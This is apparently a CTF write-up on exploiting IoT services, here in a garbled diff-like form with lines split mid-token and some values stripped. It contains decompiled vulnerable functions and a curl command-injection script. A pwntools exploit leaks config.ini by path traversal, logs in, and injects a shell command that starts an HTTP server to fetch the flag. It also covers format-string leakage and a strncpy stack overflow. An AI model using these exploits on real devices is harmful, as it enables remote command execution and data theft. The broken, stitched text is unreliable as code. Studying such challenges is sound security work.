-__int64 __fastcall sub_BFDC50(__int64 a1, __int64 a2){ __int64 v2; // rax __int64 v3; // rax __int64 v4; // rax __int64 v6; // raxint v8; // [rsp+1Ch] [rbp-114h]char v9[16]; // [rsp+20h] [rbp-110h] BYREFchar v10[16]; // [rsp+30h] [rbp-100h] BYREFchar v11[16]; // [rsp+40h] [rbp-F0h] BYREFchar v12[16]; // [rsp+50h] [rbp-E0h] BYREFchar v13[16]; // [rsp+60h] [rbp-D0h] BYREFchar v14[16]; // [rsp+70h] [rbp-C0h] BYREFchar v15[16]; // [rsp+80h] [rbp-B0h] BYREFchar v16[16]; // [rsp+90h] [rbp-A0h] BYREFchar v17[16]; // [rsp+A0h] [rbp-90h] BYREFchar v18[16]; // [rsp+B0h] [rbp-80h] BYREFchar v19[16]; // [rsp+C0h] [rbp-70h] BYREFchar v20[16]; // [rsp+D0h] [rbp-60h] BYREF _QWORD v21[10]; // [rsp+E0h] [rbp-50h] BYREF sub_7F07A4(v21);if ( sub_8403F8(a2) == 2 ) {std::allocator<char>::allocator(v20); v2 = (*(*a2 + 56LL))(a2);std::string::string(v9, v2, v20); sub_7F0840(v21, v9, 1);std::string::~string(v9);std::allocator<char>::~allocator(v20); }else {std::allocator<char>::allocator(v20); v3 = sub_BED698(a2);std::string::string(v10, v3, v20); sub_7F0840(v21, v10, 1);std::string::~string(v10);std::allocator<char>::~allocator(v20); }std::string::string(v11);std::string::string(v12);std::string::string(v13);std::string::string(v14);std::allocator<char>::allocator(v20);std::string::string(v15, "action", v20); sub_770750(v21, v15, v11);std::string::~string(v15);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v16, "fastcode", v20); sub_770750(v21, v16, v12);std::string::~string(v16);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v17, "fastpwd", v20); sub_770750(v21, v17, v13);std::string::~string(v17);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v18, "session", v20); sub_770750(v21, v18, v14);std::string::~string(v18);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v19, "{"errorcode":"0","message":"projection ok"}", v20);std::allocator<char>::~allocator(v20);if ( cmp1(v11, "stop") ) { sub_BB686A(*(a1 + 232)); sub_BD1FE2(); }else { v4 = sub_BB686A(*(a1 + 232)); sub_C004C8(v4);if ( std::string::empty(v12) != 1 && std::string::empty(v13) != 1 ) { v6 = sub_BB686A(*(a1 + 232)); v8 = sub_BD1D0A(v6, v12, v13, v14);if ( v8 < 0 ) {if ( v8 == -2 )std::string::operator=(v19, "{"errorcode":"-2","message":"qr timeout"}");elsestd::string::operator=(v19, "{"errorcode":"-4","message":"projection failed"}"); } }else {std::string::operator=(v19, "{"errorcode":"-3","message":"parameter error"}"); } }std::string::string(v20, v19); sub_BF5C9E(a1, v20, 0LL);std::string::~string(v20); (*(**(a1 + 16) + 40LL))(*(a1 + 16), 0LL, 0LL, -1LL);std::string::~string(v19);std::string::~string(v14);std::string::~string(v13);std::string::~string(v12);std::string::~string(v11); sub_7F07D4(v21);return 1LL;}
-```
-
-
-
-```
-__int64 __fastcall sub_BD1D0A(__int64 a1, __int64 a2, __int64 a3, std::string *a4){unsigned int v5; // ebx __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // raxconst char *v10; // rax __int64 v11; // rbxvoid (__fastcall *v12)(__int64, char *); // r12char v16[16]; // [rsp+30h] [rbp-3B0h] BYREFchar v17[16]; // [rsp+40h] [rbp-3A0h] BYREFchar v18[352]; // [rsp+50h] [rbp-390h] BYREFchar buf[256]; // [rsp+1B0h] [rbp-230h] BYREFint v20; // [rsp+2B0h] [rbp-130h]char s[256]; // [rsp+2C0h] [rbp-120h] BYREFint v22; // [rsp+3C0h] [rbp-20h]unsigned __int64 v23; // [rsp+3C8h] [rbp-18h]
- v23 = __readfsqword(0x28u);if ( std::string::empty(a4) != 1 && sub_47D427(a1 + 6680, a4) )return -2;std::ostringstream::basic_ostringstream(v18, 16LL); v6 = std::operator<<<std::char_traits<char>>(v18, " --mod=fastcontrol --fastcode=""); v7 = std::operator<<<char>(v6, a2); v8 = std::operator<<<std::char_traits<char>>(v7, "" --pwd=""); v9 = std::operator<<<char>(v8, a3);std::operator<<<std::char_traits<char>>(v9, "" --projection=1");memset(buf, 0, sizeof(buf)); v20 = 0; readlink("/proc/self/exe", buf, 0x104uLL);memset(s, 0, sizeof(s)); v22 = 0;std::ostringstream::str(v16, v18); v10 = std::string::c_str(v16);sprintf(s, ""%s" %s", buf, v10);std::string::~string(v16);if ( sub_60A256(a1 + 4952) ) { v11 = sub_60A268(a1 + 4952); v12 = *(*v11 + 232LL);std::allocator<char>::allocator(v16);std::string::string(v17, s, v16); v12(v11, v17);std::string::~string(v17);std::allocator<char>::~allocator(v16); } v5 = 0;std::ostringstream::~ostringstream(v18);return v5;}
-```
-
-
-
-```
+__int64 __fastcall sub_BFDC50(__int64 a1, __int64 a2){ __int64 v2; // rax __int64 v3; // rax __int64 v4; // rax __int64 v6; // raxint v8; // [rsp+1Ch] [rbp-114h]char v9[16]; // [rsp+20h] [rbp-110h] BYREFchar v10[16]; // [rsp+30h] [rbp-100h] BYREFchar v11[16]; // [rsp+40h] [rbp-F0h] BYREFchar v12[16]; // [rsp+50h] [rbp-E0h] BYREFchar v13[16]; // [rsp+60h] [rbp-D0h] BYREFchar v14[16]; // [rsp+70h] [rbp-C0h] BYREFchar v15[16]; // [rsp+80h] [rbp-B0h] BYREFchar v16[16]; // [rsp+90h] [rbp-A0h] BYREFchar v17[16]; // [rsp+A0h] [rbp-90h] BYREFchar v18[16]; // [rsp+B0h] [rbp-80h] BYREFchar v19[16]; // [rsp+C0h] [rbp-70h] BYREFchar v20[16]; // [rsp+D0h] [rbp-60h] BYREF _QWORD v21[10]; // [rsp+E0h] [rbp-50h] BYREF sub_7F07A4(v21);if ( sub_8403F8(a2) == 2 ) {std::
+allocator<char>::
+allocator(v20); v2 = (*(*a2 + 56LL))(a2);std::
+string::
+string(v9, v2, v20); sub_7F0840(v21, v9, 1);std::
+string::~string(v9);std::
+allocator<char>::~allocator(v20); }else {std::
+allocator<char>::
+allocator(v20); v3 = sub_BED698(a2);std::
+string::
+string(v10, v3, v20); sub_7F0840(v21, v10, 1);std::
+string::~string(v10);std::
+allocator<char>::~allocator(v20); }std::
+string::
+string(v11);std::
+string::
+string(v12);std::
+string::
+string(v13);std::
+string::
+string(v14);std::
+allocator<char>::
+allocator(v20);std::
+string::
+string(v15, "action", v20); sub_770750(v21, v15, v11);std::
+string::~string(v15);std::
+allocator<char>::~allocator(v20);std::
+allocator<char>::
+allocator(v20);std::
+string::
+string(v16, "fastcode", v20); sub_770750(v21, v16, v12);std::
+string::~string(v16);std::
+allocator<char>::~allocator(v20);std::
+allocator<char>::
+allocator(v20);std::
+string::
+string(v17, "fastpwd", v20); sub_770750(v21, v17, v13);std::
+string::~string(v17);std::
+allocator<char>::~allocator(v20);std::
+allocator<char>::
+allocator(v20);std::
+string::
+string(v18, "session", v20); sub_770750(v21, v18, v14);std::
+string::~string(v18);std::
+allocator<char>::~allocator(v20);std::
+allocator<char>::
+allocator(v20);std::
+string::
+string(v19, "{"errorcode":"0","message":"projection ok"}", v20);std::
+allocator<char>::~allocator(v20);if ( cmp1(v11, "stop") ) { sub_BB686A(*(a1 + 232)); sub_BD1FE2(); }else { v4 = sub_BB686A(*(a1 + 232)); sub_C004C8(v4);if ( std::
+string::
+empty(v12) != 1 && std::
+string::
+empty(v13) != 1 ) { v6 = sub_BB686A(*(a1 + 232)); v8 = sub_BD1D0A(v6, v12, v13, v14);if ( v8 < 0 ) {if ( v8 == -2 )std::
+string::
+operator=(v19, "{"errorcode":"-2","message":"qr timeout"}");elsestd::
+string::
+operator=(v19, "{"errorcode":"-4","message":"projection failed"}"); } }else {std::
+string::
+operator=(v19, "{"errorcode":"-3","message":"parameter error"}"); } }std::
+string::
+string(v20, v19); sub_BF5C9E(a1, v20, 0LL);std::
+string::~string(v20); (*(**(a1 + 16) + 40LL))(*(a1 + 16), 0LL, 0LL, -1LL);std::
+string::~string(v19);std::
+string::~string(v14);std::
+string::~string(v13);std::
+string::~string(v12);std::
+string::~string(v11); sub_7F07D4(v21);
+return 1LL;}
+__int64 __fastcall sub_BD1D0A(__int64 a1, __int64 a2, __int64 a3, std::
+string *a4){unsigned int v5; // ebx __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // raxconst char *v10; // rax __int64 v11; // rbxvoid (__fastcall *v12)(__int64, char *); // r12char v16[16]; // [rsp+30h] [rbp-3B0h] BYREFchar v17[16]; // [rsp+40h] [rbp-3A0h] BYREFchar v18[352]; // [rsp+50h] [rbp-390h] BYREFchar buf[256]; // [rsp+1B0h] [rbp-230h] BYREFint v20; // [rsp+2B0h] [rbp-130h]char s[256]; // [rsp+2C0h] [rbp-120h] BYREFint v22; // [rsp+3C0h] [rbp-20h]unsigned __int64 v23; // [rsp+3C8h] [rbp-18h]
+ v23 = __readfsqword(0x28u);if ( std::
+string::
+empty(a4) != 1 && sub_47D427(a1 + 6680, a4) )return -2;std::
+ostringstream::
+basic_ostringstream(v18, 16LL); v6 = std::
+operator<<<std::
+char_traits<char>>(v18, " --mod=fastcontrol --fastcode=""); v7 = std::
+operator<<<char>(v6, a2); v8 = std::
+operator<<<std::
+char_traits<char>>(v7, "" --pwd=""); v9 = std::
+operator<<<char>(v8, a3);std::
+operator<<<std::
+char_traits<char>>(v9, "" --projection=1");memset(buf, 0, sizeof(buf)); v20 = 0; readlink("/proc/self/exe", buf, 0x104uLL);memset(s, 0, sizeof(s)); v22 = 0;std::
+ostringstream::
+str(v16, v18); v10 = std::
+string::
+c_str(v16);sprintf(s, ""%s" %s", buf, v10);std::
+string::~string(v16);if ( sub_60A256(a1 + 4952) ) { v11 = sub_60A268(a1 + 4952); v12 = *(*v11 + 232LL);std::
+allocator<char>::
+allocator(v16);std::
+string::
+string(v17, s, v16); v12(v11, v17);std::
+string::~string(v17);std::
+allocator<char>::~allocator(v16); } v5 = 0;std::
+ostringstream::~ostringstream(v18);
+return v5;}
 #!/bin/bashIP=$1PORT=$2CMD=$3
-curl -i -s -k -X $'GET' -H $'Host: 10.100.100.5:49496' "http://$IP:$PORT/projection?action=stop1&fastcode=12&fastpwd=2";$3;"" > /dev/null
+curl -i -s -k -X $'GET' -H $'Host: 10.100.100.5:
+49496' "http://$IP:$PORT/projection?action=stop1&fastcode=12&fastpwd=2";$3;"" > /dev/null
 echo "OK"
-```
-
-
-
-```
 "decoding failed with codepoint"
-```
-
-
-
-```
 header:+--------+---------+-----------+----------+---------+---------+| MAGIC | VERSION | TIMESTAMP | DATACRC | DATALEN | DATA |+--------+---------+-----------+----------+---------+---------+ 头部定义，MAGIC：代表一个请求的开始，固定字节序列VERSION：当前协议版本号TIMESTAMP：本次请求的时间戳DATACRC：载荷的 CRC 校验和DATALEN：载荷的长度
 data:+--------+---------+------------+----------+| OPCODE | ENCFLAG | ENCSESSION | PAYLOAD |+--------+---------+------------+----------+数据部分定义，OPCODE：表示访问哪一个功能接口ENCFLAG：标识载荷数据是否加密ENCSESSION：标识当前请求在服务端对应的 sessionPAYLOAD：JSON 格式的数据
-```
-
-
-
-```
 0: login 功能1: 上传密钥功能2: logout 功能3: 获取 LOGO 图片功能，此处为漏洞点 14: ping 网络诊断功能，此处为漏洞点 2
-```
-
-
-
-```
-{"u":<username>,"p":<password>}
-```
-
-
-
-```
+{"u":,"p":}
 {"k":<key>}
-```
-
-
-
-```
-{"d":<path>}
-```
-
-
-
-```
-json GetLogo::getlogo(string path){ json fail_payload; fail_payload["r"] = 0;if(path.length() >= 15){return fail_payload; }char* tmp_path = new char[100];snprintf(tmp_path, max_filename_len, logo_path_format.c_str(), path.c_str()); // BUG// open and read fileifstream cf(tmp_path);if(!cf.is_open()){return fail_payload; }string content;string buf;while(getline(cf, buf)){ content += buf; } json succ; succ["r"] = 1; succ["d"] = content;return succ;}
-```
-
-
-
-```
+{"d":}
+json GetLogo::
+getlogo(string path){ json fail_payload; fail_payload["r"] = 0;if(path.length() >= 15){return fail_payload; }char* tmp_path = new char[100];snprintf(tmp_path, max_filename_len, logo_path_format.c_str(), path.c_str()); // BUG// open and read fileifstream cf(tmp_path);if(!cf.is_open()){return fail_payload; }string content;string buf;while(getline(cf, buf)){ content += buf; } json succ; succ["r"] = 1; succ["d"] = content;
+return succ;}
 /home/iot/Desktop/Cpp/%s.png
-```
-
-
-
-```
 /home/iot/Desktop/Cpp////config.ini.png
-```
-
-
-
-```
-json Ping::ping(){ json fail_payload; fail_payload["r"] = 0;// check ip addressstring block1 = "`";string block2 = "&";string block3 = "|";string block4 = ";";string block6 = " ";string block7 = "/";if(ip_address.length() > 64){return fail_payload; }if(ip_address.find(block1) != string::npos || ip_address.find(block2) != string::npos || ip_address.find(block3) != string::npos || ip_address.find(block4) != string::npos || ip_address.find(block6) != string::npos || ip_address.find(block7) != string::npos){return fail_payload; }if(count > 10){return fail_payload; }char* cmd = new char[MAXLEN];string file_to_exec1 = "p";string file_to_exec2 = "i";string file_to_exec3 = "n";string file_to_exec4 = "g";string file_to_exec = file_to_exec1 + file_to_exec2 + file_to_exec3 + file_to_exec4;string param0 = " ";string param1 = "-";string param2 = "c";string param = param0 + param1 + param2;string tmp_format = "%d";string tmp_format2 = "%s";string tmp_cmd = file_to_exec + param + param0 + tmp_format + param0 + tmp_format2;sprintf(cmd, tmp_cmd.c_str(), count, ip_address.c_str()); system(cmd); json succ; succ["r"] = 1;return succ;}
-```
-
-
-
-```
-{"i":<ip 地址>,"c":<ping 次数>}
-```
-
-
-
-```
+json Ping::
+ping(){ json fail_payload; fail_payload["r"] = 0;// check ip addressstring block1 = "`";string block2 = "&";string block3 = "|";string block4 = ";";string block6 = " ";string block7 = "/";if(ip_address.length() > 64){return fail_payload; }if(ip_address.find(block1) != string::
+npos || ip_address.find(block2) != string::
+npos || ip_address.find(block3) != string::
+npos || ip_address.find(block4) != string::
+npos || ip_address.find(block6) != string::
+npos || ip_address.find(block7) != string::
+npos){return fail_payload; }if(count > 10){return fail_payload; }char* cmd = new char[MAXLEN];string file_to_exec1 = "p";string file_to_exec2 = "i";string file_to_exec3 = "n";string file_to_exec4 = "g";string file_to_exec = file_to_exec1 + file_to_exec2 + file_to_exec3 + file_to_exec4;string param0 = " ";string param1 = "-";string param2 = "c";string param = param0 + param1 + param2;string tmp_format = "%d";string tmp_format2 = "%s";string tmp_cmd = file_to_exec + param + param0 + tmp_format + param0 + tmp_format2;sprintf(cmd, tmp_cmd.c_str(), count, ip_address.c_str()); system(cmd); json succ; succ["r"] = 1;
+return succ;}
+{"i":,"c":}
 int do_enc_dec(char* buf, unsigned int length){if(enc_key.length() != 32){return FAIL; }if(length >= MAXLEN){return FAIL; }int i = 0, j = 0;while(1){if(i >= length){break; }if(j >= 32){ j = 0; } buf[i] = buf[i] ^ enc_key.c_str()[j]; i++; j++; }return SUCCESS;}
-```
-
-
-
-```
 from pwn import *import timeimport base64
 crc32tab = [0x00000000, 0x77073096, 0xee0e612c, 0x990951ba,0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940,0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116,0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a,0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818,0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c,0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086,0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4,0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe,0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252,0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60,0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04,0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a,0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e,0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0,0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6,0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d] # 0x2d02ef8d to 0x2d02ef8e
 def mycrc32(data): crc = 0x0for i in range(len(data)): crc = crc32tab[(crc ^ data[i]) & 0xff] ^ (crc >> 8)return crc ^ 0xFFFFFFFF
-def do_enc_dec(data, key): i = 0 j = 0 length = len(data) res = bytearray(length) while True:if i >= length:breakif j >= 32: j = 0 res[i] = data[i] ^ ord(key[j]) i += 1 j += 1return res
+def do_enc_dec(data, key): i = 0 j = 0 length = len(data) res = bytearray(length) while True:if i >= length:
+breakif j >= 32: j = 0 res[i] = data[i] ^ ord(key[j]) i += 1 j += 1return res
 context.log_level = "DEBUG"
 # p = process("./diagnose")p = remote("20.21.2.27", 50413)
 # ==== get logo ====print("Leak user info")magic = b"MULBERRY"version = 1timestamp = int(time.time())opcode = 3encflag = 0encsession = 0data = b'{"d":"///config.ini"}x00'datacrc = mycrc32(data)datalen = len(data)payload3 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload3)p.recvuntil(b""r":1}")
-# ==== login ====print("Login")opcode = 0# data = b'{"u":"xhlj2022","p":"mysecretpasswd"}x00' # login successdata = b'{"u":"xhlj2022","p":"C4nY0uGu3ssmE?"}x00' # login successdatacrc = mycrc32(data)datalen = len(data)payload = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload)p.recvuntil(b""e":")timestamp = int(p.recvuntil(b",")[:-1])print(timestamp)p.recv()
+# ==== login ====print("Login")opcode = 0
+# data = b'{"u":"xhlj2022","p":"mysecretpasswd"}x00' # login successdata = b'{"u":"xhlj2022","p":"C4nY0uGu3ssmE?"}x00' # login successdatacrc = mycrc32(data)datalen = len(data)payload = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload)p.recvuntil(b""e":")timestamp = int(p.recvuntil(b",")[:-1])print(timestamp)p.recv()
 # ==== put key ====print("Upload key")opcode = 1data = b'{"k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}x00'datalen = len(data)datacrc = mycrc32(data)encsession = timestampencflag = 1payload2 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload2)p.recvuntil(b""r":1}")
 # # === ping ===print("Start HTTP server")opcode = 4data = b'{"k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","i":"$(python$IFS-m${IFS}http.server$IFS-d$IFS${PATH:0:1})","c":4}x00'data = base64.b64encode(do_enc_dec(data, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))datalen = len(data)datacrc = mycrc32(data)encsession = timestampencflag = 1payload2 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload2)
 print("Waiting for 15s")sleep(15)
-print("Fetch flag")os.system("curl http://20.21.2.27:8000/flag.txt")
+print("Fetch flag")os.system("curl http://20.21.2.27:
+8000/flag.txt")
 p.interactive()
-```
-
-
-
-```
 int sub_108C8(){char s[20]; // [sp+0h] [bp-54h] BYREFchar s2[20]; // [sp+14h] [bp-40h] BYREFchar haystack[24]; // [sp+28h] [bp-2Ch] BYREFchar *format; // [sp+40h] [bp-14h]char *v5; // [sp+44h] [bp-10h]char *v6; // [sp+48h] [bp-Ch]int v7; // [sp+4Ch] [bp-8h]
  v7 = 0; v6 = getenv("HTTP_COOKIES");memset(s, 0, 0x11u); sub_107E8(s);if ( v6 ) {memset(haystack, 0, 0x17u);snprintf(haystack, 0x16u, "%s", v6); v5 = strstr(haystack, "uuid=");if ( v5 ) { format = v5 + 5;memset(s2, 0, 0x11u);snprintf(s2, 0x11u, v5 + 5); // bugputs(s2);if ( !strncmp(s, s2, 0x10u) ) v7 = 1; } }return v7;}char *__fastcall sub_107E8(char *a1){char *result; // r0char s[24]; // [sp+Ch] [bp-28h] BYREFchar *v4; // [sp+24h] [bp-10h]char *v5; // [sp+28h] [bp-Ch] FILE *stream; // [sp+2Ch] [bp-8h]
 memset(s, 0, 0x17u); stream = fopen("/var/tmp/session", "r");if ( !stream ) {printf("No Session");exit(1); } fgets(s, 22, stream); fclose(stream); result = strstr(s, "uuid="); v5 = result;if ( result ) { v4 = v5 + 5;snprintf(s, 0x11u, "%s", v5 + 5); result = strncpy(a1, s, 0x10u); }return result;
-```
-
-
-
-```
 char *__fastcall sub_10B48(char *result){unsigned __int8 *s1; // [sp+4h] [bp-D20h]char v2[3316]; // [sp+Ch] [bp-D18h] BYREFchar *v3; // [sp+D00h] [bp-24h]char *v4; // [sp+D04h] [bp-20h]size_t v5; // [sp+D08h] [bp-1Ch]int v6; // [sp+D0Ch] [bp-18h]size_t n; // [sp+D10h] [bp-14h]int v8; // [sp+D14h] [bp-10h]int v9; // [sp+D18h] [bp-Ch]char *s2; // [sp+D1Ch] [bp-8h]
  s1 = (unsigned __int8 *)result; s2 = "*#$^";if ( result ) {if ( !strncmp(result, s2, 4u) ) { v9 = s1[4]; v8 = s1[5] + 2 * v9; n = s1[6] + 4 * v8; v6 = s1[7]; v5 = s1[8] + 2 * v6;memset(v2, 0, sizeof(v2));memcpy(v2, s1, n); result = strstr(v2, "*#$^"); v4 = result;if ( result ) { v3 = &v4[v5 - 0x4D];if ( *v3 ) result = sub_10AFC(v3, v5); } }else { result = strstr(v2, "ping");if ( result ) result = (char *)sub_109B0("20.21.2.26"); } }return result;}
-```
-
-
-
-```
 char *__fastcall sub_10AFC(char *result, size_t a2){ char dest[752]; // [sp+Ch] [bp-2F8h] BYREF size_t n; // [sp+2FCh] [bp-8h]
  n = a2; if ( result ) result = strncpy(dest, result, n); // bug return result;}
-.text:00010AFC sub_10AFC ; CODE XREF: sub_10B48+17C↓p.text:00010AFC.text:00010AFC var_304 = -0x304.text:00010AFC src = -0x300.text:00010AFC dest = -0x2F8.text:00010AFC n = -8.text:00010AFC.text:00010AFC PUSH {R11,LR}.text:00010B00 ADD R11, SP, #4.text:00010B04 SUB SP, SP, #0x300.text:00010B08 STR R0, [R11,#src].text:00010B0C STR R1, [R11,#var_304].text:00010B10 LDR R3, [R11,#var_304].text:00010B14 STR R3, [R11,#n].text:00010B18 LDR R3, [R11,#src].text:00010B1C CMP R3, #0.text:00010B20 BEQ loc_10B3C.text:00010B24 LDR R2, [R11,#n] ; n.text:00010B28 SUB R3, R11, #-dest.text:00010B2C LDR R1, [R11,#src] ; src.text:00010B30 MOV R0, R3 ; dest.text:00010B34 BL strncpy.text:00010B38 NOP.text:00010B3C.text:00010B3C loc_10B3C ; CODE XREF: sub_10AFC+24↑j.text:00010B3C NOP.text:00010B40 SUB SP, R11, #4.text:00010B44 POP {R11,PC}
-```
-
-
-
-```
-export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONTENT_LENGTH=3000export CONTENT_TYPE='application/x-www-form-urlencoded'cat payload.txt | gdbserver 0.0.0.0:1234 ./var/www/cgi-bin/55.cgi
-```
-
-
-
-```
+.text:
+00010AFC sub_10AFC ; CODE XREF: sub_10B48+17C↓p.text:
+00010AFC.text:
+00010AFC var_304 = -0x304.text:
+00010AFC src = -0x300.text:
+00010AFC dest = -0x2F8.text:
+00010AFC n = -8.text:
+00010AFC.text:
+00010AFC PUSH {R11,LR}.text:
+00010B00 ADD R11, SP, #4.text:
+00010B04 SUB SP, SP, #0x300.text:
+00010B08 STR R0, [R11,#src].text:
+00010B0C STR R1, [R11,#var_304].text:
+00010B10 LDR R3, [R11,#var_304].text:
+00010B14 STR R3, [R11,#n].text:
+00010B18 LDR R3, [R11,#src].text:
+00010B1C CMP R3, #0.text:
+00010B20 BEQ loc_10B3C.text:
+00010B24 LDR R2, [R11,#n] ; n.text:
+00010B28 SUB R3, R11, #-dest.text:
+00010B2C LDR R1, [R11,#src] ; src.text:
+00010B30 MOV R0, R3 ; dest.text:
+00010B34 BL strncpy.text:
+00010B38 NOP.text:
+00010B3C.text:
+00010B3C loc_10B3C ; CODE XREF: sub_10AFC+24↑j.text:
+00010B3C NOP.text:
+00010B40 SUB SP, R11, #4.text:
+00010B44 POP {R11,PC}
+export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONTENT_LENGTH=3000export CONTENT_TYPE='application/x-www-form-urlencoded'cat payload.txt | gdbserver 0.0.0.0:
+1234 ./var/www/cgi-bin/55.cgi
 export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONTENT_LENGTH=3000export CONTENT_TYPE='application/x-www-form-urlencoded'
 cat payload.txt | ./qemu-arm-static -g 1234 -L /usr/arm-linux-gnueabi/ ./55.cgi
-```
-
-
-
-```
 gdb-multiarch ./55.cgi -x xgdb.sh
-```
-
-
-
-```
-set architecture arm │0x407ff6d4: 'C' <repeats 200 times>...set endian little │0x407ff79c: 'C' <repeats 200 times>... │0x407ff864: 'C' <repeats 160 times>, "334t 01"b *0x10B34 │0x407ff908: ""b *0x10B44 │0x407ff909: ""target remote 127.0.0.1:1234
-```
-
-
-
-```
+set architecture arm │0x407ff6d4: 'C' <repeats 200 times>...set endian little │0x407ff79c: 'C' <repeats 200 times>... │0x407ff864: 'C' <repeats 160 times>, "334t 01"b *0x10B34 │0x407ff908: ""b *0x10B44 │0x407ff909: ""target remote 127.0.0.1:
+1234
 import requests from pwn import * import binascii
 IP = "20.21.2.27"
-url = "http://{}/cgi-bin/63.cgi".format(IP)uuid = ""for i in range(2, 6): r = requests.get( url=url, headers={"COOKIES": "uuid=%{}$x".format(str(i))} ) res = r.text.split('n')[0] uuid += binascii.unhexlify(res).decode()[::-1] print(uuid) 
